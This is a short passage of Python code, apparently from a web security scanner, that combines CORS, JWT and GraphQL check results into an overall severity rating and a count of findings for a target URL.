    for res in (cors_result, jwt_result, graphql_result):
        sev = res.get("overall_severity", "None")
        if sev != "None":
            all_severities.append(sev)

    overall = min(all_severities, key=lambda s: SEV_ORDER.get(s, 99)) if all_severities else "None"

    total_findings = (
        len(cors_result.get("findings", [])) +
        len(jwt_result.get("findings", [])) +
        len(graphql_result.get("findings", []))
    )

    return {
        "target":          base_url,
        "overall_severity": overall,
        "total_findings":  total_findings,
        "cors":            cors_result,
        "jwt":             jwt_result,
        "graphql":         graphql_result,
    }

